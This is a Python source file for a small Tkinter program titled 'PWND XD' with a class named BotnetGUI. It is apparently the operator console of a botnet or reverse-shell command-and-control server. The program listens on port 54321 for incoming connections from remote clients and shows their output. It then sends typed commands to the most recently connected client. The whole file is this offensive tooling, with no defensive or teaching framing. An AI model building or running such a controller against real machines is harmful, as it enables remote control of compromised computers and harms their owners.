import sys
import threading
import socket
import tkinter as tk
from tkinter.scrolledtext import ScrolledText

class BotnetGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("PWND XD")

        self.output_area = ScrolledText(root, wrap=tk.WORD, height=20, width=80)
        self.output_area.pack(padx=10, pady=10)

        self.command_entry = tk.Entry(root, width=80)
        self.command_entry.pack(padx=10, pady=10)
        self.command_entry.bind("<Return>", self.send_command)

        self.client_socket = None
        self.clients = {}
        self.start_server()

    def start_server(self):
        threading.Thread(target=self.connect_to_server, daemon=True).start()

    def connect_to_server(self):
        HOST = '0.0.0.0'
        PORT = 54321

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        self.append_output(f"[*] Listening on {HOST}:{PORT}")

        while True:
            client_socket, addr = server_socket.accept()
            #prevent multiple connections
            if addr not in self.clients:
                self.clients[addr] = client_socket
                self.client_socket = client_socket
                self.append_output(f"[*] Accepted connection from {addr}")
                threading.Thread(target=self.handle_client, args=(client_socket, addr), daemon=True).start()
            else:
                client_socket.close()

    def handle_client(self, client_socket, addr):
        while True:
            try:
                response = client_socket.recv(4096).decode('utf-8')
                if response:
                    self.append_output(response)
            except Exception as e:
                self.append_output(f"Connection error with {addr}: {e}")
                client_socket.close()
                if addr in self.clients:
                    del self.clients[addr]
                break

    def send_command(self, event=None):
        command = self.command_entry.get()
        if self.client_socket and command:
            try:
                self.client_socket.sendall(command.encode('utf-8'))
                self.append_output(f"> {command}")
            except Exception as e:
                self.append_output(f"Failed to send command: {e}")
                self.client_socket = None #reset on failure
            self.command_entry.delete(0, tk.END)

    def append_output(self, message):
        self.output_area.insert(tk.END, message + "\n")
        self.output_area.yview(tk.END)

def run_gui():
    root = tk.Tk()
    gui = BotnetGUI(root)
    root.mainloop()

if __name__ == "__main__":
    run_gui()